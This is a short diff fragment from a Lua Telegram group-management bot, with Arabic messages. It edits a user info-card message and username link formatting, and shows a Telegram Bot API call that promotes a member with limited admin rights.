 send(msg.chat_id_, msg.id_,'[\n༻┉𖦹┉┉𖦹┉┉𖦹┉┉𖦹┉༺\n• |𝗜𝗗  ⁞'..msg.sender_user_id_..'\n• |𝗨𝗦𝗘 ⁞ '..username..'\n• |𝗦𝗧𝗔  ⁞'..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n• |𝗦𝗧𝗔  ⁞ '..rtpa..'\n• |𝗔𝗨𝗧𝗢 ⁞'..Total_Msg(Msguser)..'\n• |𝗠𝗦𝗚  ⁞ '..Msguser..'\n• |𝗣𝗢𝗜𝗡𝗧𝗦 ⁞ '..NUMPGAME..']\n༻┉𖦹┉┉𖦹┉┉𖦹┉┉𖦹┉༺\n')   
 else
-send(msg.chat_id_, msg.id_, '\n⚠️| الصوره ←  ليس لديك صور في حسابك 🍃'..'[\n༻┉𖦹┉┉𖦹┉┉𖦹┉┉𖦹┉༺\n• |𝗜𝗗  ⁞'..msg.sender_user_id_..'\n• |𝗨𝗦𝗘 ⁞ '..username..'\n• |𝗦𝗧𝗔  ⁞ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n• |𝗦𝗧𝗔  ⁞ '..rtpa..'\n• |𝗔𝗨𝗧𝗢 ⁞'..Total_Msg(Msguser)..'\n• |𝗠𝗦𝗚  ⁞'..Msguser..'\n• |𝗣𝗢𝗜𝗡𝗧𝗦 ⁞ '..NUMPGAME..']\n༻┉𖦹┉┉𖦹┉┉𖦹┉┉𖦹┉༺\n')   
+send(msg.chat_id_, msg.id_, '\n⚠️| الصوره ←  ليس لديك صور في حسابك 🍃'..'[\n༻┉𖦹┉┉𖦹┉┉𖦹┉┉𖦹┉༺\n• |𝗜𝗗  ⁞'..msg.sender_user_id_..'\n• |𝗨𝗦?? ⁞ '..username..'\n• |𝗦𝗧𝗔  ⁞ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n• |𝗦𝗧𝗔  ⁞ '..rtpa..'\n• |𝗔𝗨𝗧𝗢 ⁞'..Total_Msg(Msguser)..'\n• |𝗠𝗦𝗚  ⁞'..Msguser..'\n• |𝗣𝗢𝗜𝗡𝗧𝗦 ⁞ '..NUMPGAME..']\n༻┉𖦹┉┉𖦹┉┉𖦹┉┉𖦹┉༺\n')   
 end 
 end
 end
@@ -10817,7 +10820,7 @@ send(msg.chat_id_, msg.id_,' البوت ليس مشرف يرجى ترقيتي !'
 return false  
 end
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..') '
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..') '
 status  = '\n📮| الايدي » '..result.sender_user_id_..'*\n✓| تم اضافـة {'..timsh..'} كلقب له*'
 send(msg.chat_id_, msg.id_, usertext..status)
 https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
